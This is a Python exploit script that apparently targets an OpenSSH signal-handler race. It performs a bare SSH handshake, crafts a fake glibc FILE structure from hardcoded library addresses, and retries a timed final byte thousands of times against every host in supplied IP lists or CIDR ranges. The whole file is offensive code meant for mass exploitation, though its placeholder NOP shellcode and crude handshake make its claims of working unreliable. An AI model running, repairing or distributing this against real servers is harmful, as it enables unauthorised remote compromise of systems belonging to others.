#!/usr/bin/env python3

import argparse
import ipaddress
import socket
import struct
import time

GLIBC_BASES = [0xB7200000, 0xB7400000]
SHELLCODE = b"\x90\x90\x90\x90"
MAX_ATTEMPTS = 20000
SLEEP_INTERVAL = 0.1  # 100ms
MAX_PACKET_SIZE = 1024


def setup_connection(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(0)
    server_address = (ip, port)
    sock.connect_ex(server_address)
    return sock


def send_packet(sock, packet_type, data):
    packet_len = len(data) + 5
    packet = struct.pack(">I", packet_len) + struct.pack("B", packet_type) + data
    sock.sendall(packet)


def send_ssh_version(sock):
    ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    sock.sendall(ssh_version)


def receive_ssh_version(sock):
    while True:
        try:
            response = sock.recv(256)
            if response:
                print(f"Received SSH version: {response.decode()}")
                break
        except BlockingIOError:
            time.sleep(0.1)


def send_kex_init(sock):
    kexinit_payload = b"\x00" * 36
    send_packet(sock, 20, kexinit_payload)


def receive_kex_init(sock):
    while True:
        try:
            response = sock.recv(1024)
            if response:
                print(f"Received KEX_INIT ({len(response)} bytes)")
                break
        except BlockingIOError:
            time.sleep(0.1)


def perform_ssh_handshake(sock):
    send_ssh_version(sock)
    receive_ssh_version(sock)
    send_kex_init(sock)
    receive_kex_init(sock)


def create_fake_file_structure(data, glibc_base):
    fake_file = struct.pack(
        "<QQQQQQQQQQQQQQQ", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x61
    )
    vtable_offset = struct.pack("<Q", glibc_base + 0x21B740)
    codecvt_offset = struct.pack("<Q", glibc_base + 0x21D7F8)
    data[: len(fake_file)] = fake_file
    data[-16:] = vtable_offset + codecvt_offset


def attempt_race_condition(sock, parsing_time, glibc_base):
    final_packet = bytearray(MAX_PACKET_SIZE)
    create_fake_file_structure(final_packet, glibc_base)
    final_packet[: len(SHELLCODE)] = SHELLCODE
    sock.sendall(final_packet[:-1])
    time.sleep(parsing_time - 0.001)
    sock.sendall(final_packet[-1:])
    try:
        response = sock.recv(1024)
        if response:
            print(
                "Received response after exploit attempt " + f"({len(response)} bytes)"
            )
            return True
    except BlockingIOError:
        return False
    return False


def perform_exploit(ip, port):
    success = False
    for glibc_base in GLIBC_BASES:
        print("Attempting exploitation " + f"{ip} with glibc base: 0x{glibc_base:x}")
        for attempt in range(MAX_ATTEMPTS):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of {MAX_ATTEMPTS}")
            try:
                sock = setup_connection(ip, port)
                perform_ssh_handshake(sock)
                parsing_time = 0.5
                if attempt_race_condition(sock, parsing_time, glibc_base):
                    print(
                        "Possible exploitation success on attempt "
                        + f"{attempt} with glibc base 0x{glibc_base:x}!"
                    )
                    success = True
                    break
            except Exception as e:
                print(f"Error on attempt {attempt}: {e}")
            finally:
                sock.close()
                time.sleep(SLEEP_INTERVAL)
        if success:
            break
    return success


parser = argparse.ArgumentParser(
    description="Check if servers are running a vulnerable version of OpenSSH and perform exploitation if possible."
)
parser.add_argument(
    "targets",
    nargs="*",
    help="IP addresses, domain names, file paths containing IP addresses, or CIDR network ranges.",
)
parser.add_argument(
    "--port", type=int, default=22, help="Port number to check (default: 22)."
)
parser.add_argument(
    "-s",
    "--sleep",
    type=float,
    default=0.1,
    help="Sleep in seconds (default: 0.1 second / 100ms).",
)

args = parser.parse_args()
SLEEP_INTERVAL = args.sleep

ips = []
for target in args.targets:
    if "/" in target:
        try:
            network = ipaddress.ip_network(target, strict=False)
            ips.extend([str(ip) for ip in network.hosts()])
        except ValueError:
            print(f"❌ [-] Invalid CIDR notation: {target}")
    else:
        ips.append(target)

for ip in ips:
    success = perform_exploit(ip, args.port)
    if success:
        print(f"\n[!] Successfully exploited server at {ip}!\n")
    else:
        print(f"\n[!] Exploitation attempt failed for server at {ip}\n")
